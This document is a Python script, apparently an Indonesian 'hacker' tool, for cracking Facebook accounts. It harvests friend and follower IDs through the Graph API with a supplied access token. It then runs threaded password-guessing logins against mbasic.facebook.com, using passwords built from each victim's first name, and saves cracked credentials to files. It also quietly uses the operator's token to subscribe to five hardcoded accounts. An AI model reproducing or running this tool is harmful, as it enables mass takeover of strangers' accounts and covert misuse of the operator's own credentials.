#!/usr/bin/python
#encoding=utf-8
import requests as req,json,time,os,sys,re
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser
from random import choice as awokawok

id=[]
ok,cp,cot=0,0,0
ajg=""

def login():
	os.system("clear")
	print("""
	  ●▬▬▬▬▬▬HACKER PRO YT HERUL GMG NIH BOS!▬▬▬▬▬▬● 
	  HACKER PRO YT HERUL GMG NIH BOS !
	  INFO : PREMIUM NIH BOS !
	  PERINGATAN : YANG PENTING KAN FREESTYLE DULU BOS!
	  GitHub : https://github.com/HACKERPROYTHERULGMG
	  ~ • HACKER NIH BOS YT HERUL GMG • ~
	  ●▬▬▬▬▬▬HACKER PRO YT HERUL GMG NIH BOS!▬▬▬▬▬▬●
	""")
	print("[1]. Masukan Token FB\n[2]. Keluar\n")
	pil=input("[!] Pilih : ")
	if(pil in ("01","1")):
		to=input("[+] Masukan Token FB : ")
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
		try:
			nama=r['name']
			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100004018035398/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100071145853652/subscribers?access_token={to}')
			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={to}")
			req.post(f"https://graph.facebook.com/100069718286138/subscribers?access_token={to}")
			print(f"[☆] Berhasil Masuk [♥]\nSELAMAT DATANG{nama}")
			open("save","a").write(to)
			time.sleep(1.5)
			crack(to,nama).menu()
		except KeyError:
			print("[×] Gagal Masuk! [×]\nToken FB Salah!")
			time.sleep(1.5)
			login()
	elif(pil in ("2","02")):
		exit("Terima Kasih! Jangan Lupa Subscribe Channel YT HERUL GMG!")
	elif(pil in (" ","  ","   ","    ","     ")):
		print("[!] Kosong Bro!")
		time.sleep(1)
		login()
	else:
		print("[!] Tidak Ada Pilihan!")
		time.sleep(1)
		login()
def logika():
	try:
		token=open("save","r").read()
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
		nama=r['name']
		print(f"[✔] Anda Sudah Berhasil Masuk [♥]\nKembali Lagi Bro!{nama}")
		time.sleep(1.5)
		crack(token,nama).menu()
	except FileNotFoundError:
		print("Kamu Belum Login!")
		time.sleep(2)
		login()
	except KeyError:
		os.system("rm -rf save")
		exit("Token FB Kadaluarsa!")
		
class crack:
	
	def __init__(self,token,nama):
		self.token,self.nama=token,nama
	def jalan(self,text):
		for jalan in text+"\n":
			sys.stdout.write(jalan)
			sys.stdout.flush()
			time.sleep(0.02)
	def crack(self,user,lala,asu):
		global ok,cp,cot,ajg
		for x in range(2):
			ua=awokawok(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",open("ua","r").read()])
		if ajg!=user:
			ajg=user
			cot+=1
		for pw in lala:
			pw=pw.replace('nama',asu)
			data={}
			ses=req.Session()
			ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
			a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8",headers={"user-agent":ua}).text,"html.parser")
			b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for c in a("input"):
				try:
					if c.get("name") in b:data.update({c.get("name"):c.get("value")})
					else:continue
				except:pass
			data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
			if 'c_user' in d.cookies.get_dict().keys():
				ok+=1
				open('ok','a').write(user+'|'+pw+'\n')
				print(f'\r\33[32;1m* --> [BERHASIL] {user}|{pw}\33[37;1m             \n',end='')
				break
			elif 'checkpoint' in d.cookies.get_dict().keys():
				cp+=1
				open('cp','a').write(user+'|'+pw+'\n')
				try:
					ttl='|'+json.loads(req.get(f'https://graph.facebook.com/{user}?access_token={self.token}').text)['birthday']
				except KeyError:ttl='|'
				print(f'\r\33[1;33m* --> [BERHASIL] {user}|{pw}{ttl}\33[37;1m              \n',end='')
				break
			print(f'\r[=] HACK AKUN FB {str(cot)}/{len(id)} OK:-[{str(ok)}] CP:-[{str(cp)}]',end='')
	def kirim(self):
		self.jalan(f"\nJumlah ID : {str(len(id))}")
		pil=input("Menggunakan Password AUTO / manual [Y/T]: ")
		if(pil in ("y","Y")):
			with Bool(max_workers=35) as kirim:
				print("Contoh Password (sayang,gasken123,freefire)")
				pwList=input("Pilih Password : ").split(",")
				self.jalan(f'\n[√] Hack Akun Facebook : {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				for email in id:
					uid,name=email.split("|")
					kirim.submit(self.crack,uid,pwList,name.lower())
		elif(pil in ("t","T")):
			with Bool(max_workers=35) as kirim:
				self.jalan(f'\n[√] Hack Akun Facebook : {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				for email in id:
					uid,name=email.split("|")
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','anjing','sayang']
					elif(len(str(name.lower()))<=2):
						pw=[name.lower()+'1234',name.lower()+'12345','anjing','sayang']
					elif(len(str(name.lower()))<=3):
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','anjing','sayang']
					else:
						pw=[name.lower()+'12345','anjing','sayang']
					kirim.submit(self.crack,uid,pw,name.lower())
		else:
			self.jalan(("Pilihan Tidak Ada"))
	def useragent(self):
		ua=open("ua","r").read()
		print("\n[🔗] USER AGENT SEKARANG :",ua)
		print("\nGANTI USERAGENT ?")
		yt=input("[OK] Oke [Y/T]: ")
		if(yt in ("y","Y")):
			os.system("rm -rf ua")
			uaBaru=input("[✔] MASUKAN USERAGENT BARU :")
			open("ua","w").write(uaBaru)
			input("\n[✓] Berhasil Mengganti\nKembali!")
			self.menu()
		elif(yt in ("t","T")):
			self.menu()
	def menu(self):
		wok=[]
		os.system('clear')
		ha=0
		print("""
        ●▬▬▬▬▬▬[][][]▬▬▬▬▬▬● 
        HACKER PRO YT HERUL GMG
        Premium YT HERUL GMG
        HACKER NIH BOSS!
        GiThub : https://github.com/HACKERPROYTHERULGMG
        Note : YANG PENTING KAN FREESTYLE DULU BOS!
        VERSI : PREMIUM BOS!
        ~ • MAU DI HACK AKUN MU? •~
        ●▬▬▬▬▬▬[][][]▬▬▬▬▬▬● 
        """)
		self.jalan(f"[♥] JANGAN LUPA SUBSCRIBE CHANNEL YT HERUL GMG {self.nama} Terima Kasih\n")
		print('[01.] Hack Facebook Teman/Teman Publik\n[02]. Hack Daftar Pengikut\n[03]. Hasil Hack\n[04]. Pengaturan\n[05]. Keluar\n[06]. Hubungi Kontak : YT HERUL GMG')
		print(f'+'+'-'*45+'+\n')
		pil=input('[➕] Pilih : ')
		if(pil in ('01','1')):
			print('\n\t●▬▬▬▬▬▬HACKER PRO YT HERUL GMG NIH BOS!▬▬▬▬▬▬●')
			try:
				jumlah=int(input("\n[➕] Jumlah Target \n[📃]Masukan Jumlah Target : "))
				if(jumlah>=11):
					print("\n[📃] Target Banyak Harus 10!")
					time.sleep(2)
					self.menu()
				else:pass
			except:jumlah=1
			print("\nMasukan ID Target Teman Anda!!")
			for j in range(jumlah):
				ha+=1
				target=input(f"[➕] Masukan ID Target Teman {ha}: ").replace("'me'","me")
				try:
					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
					print(f"[📃] Nama Tagret Anda\t: {rr['name']}")
					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
					for x in ro['data']:
						wok.append(x['id'])
					print(f"[📃] Jumlah ID\t: {len(wok)}")
					wok.clear()
				except KeyError:
					print("Tidak Ada Target")
					time.sleep(1)
					self.menu()
				r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
				for x in r['data']:
					idnya=x['id']
					nama=x['name'].rsplit(' ')[0]
					id.append(idnya+'|'+nama)
			self.kirim()
		elif(pil in ('02','2')):
			print('\n\t●▬▬▬▬▬▬HACKER PRO YT HERUL GMG NIH BOS!▬▬▬▬▬▬●')
			try:
				jumlah=int(input("\n[➕] Target Harus 10 Bro!\n[?] Masukan Jumlah Target Anda : "))
				if(jumlah>=11):
					print("\n[📃] Target Harus 10")
					time.sleep(2)
					self.menu()
				else:pass
			except:jumlah=1
			print("\nKetikan 'me' Hack Akun FB Pengikut :")
			for j in range(jumlah):
				target=input("[➕] Masukan ID Target Anda : ").replace("'me'","me")
				try:
					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
					print(f"[📃] Nama Target Anda\t: {rr['name']}")
					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
					for x in ro['data']:
						wok.append(x['id'])
					print(f"[📃] Jumlah ID\t: {len(wok)}")
					wok.clear()
				except KeyError:
					print("Tidak Ada Target")
					time.sleep(1)
					self.menu()
				r=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
				for x in r['data']:
					idnya=x['id']
					nama=x['name'].rsplit(' ')[0]
					id.append(idnya+'|'+nama)
			self.kirim()
		elif(pil in ("c","C")):
			print("\n\nCek Hasil Target Anda\n[01]. Berhasil ✔\n[02]. Berhasil Sesi ✔\n[03]. Kembali\n")
			hh=input("[✔] Pilih :")
			if(hh in ("01","1")):
				try:
					print("\n"+open("ok","r").read())
					input("Kembali")
					self.menu()
				except FileNotFoundError:
					input("\n[✔] Tidak Ada Hasil\nKembali")
					self.menu()
			elif(hh in ("02","2")):
				try:
					print("\n"+open("cp","r").read())
					input("Kembali")
					self.menu()
				except FileNotFoundError:
					input("\n[✔] Tidak Ada Hasil\nKembali")
					self.menu()
			elif(hh in ("03","3")):
				self.menu()
		elif(pil in ("s","S")):
			self.useragent()
		elif(pil in ('l','L')):
			os.system('rm -rf save')
			exit('\nBerhasil Kembali')
		elif(pil in ("r","R")):
			print("\n[√] Whatsapp Hacker YT HERUL GMG\n[√] Buka Whatsapp")
			os.system("xdg-open https://wa.me/6283815647202")

if __name__=="__main__":
	try:
		open("ua","r").read()
	except FileNotFoundError:
		print("[🔗] Tidak Ada USERAGENT")
		tll=input("[✔] Masukan USERAGENT: ")
		open("ua","a").write(tll)
		print("[✔] Berhasil\nMembuka Pengaturan")
		time.sleep(1)
	logika()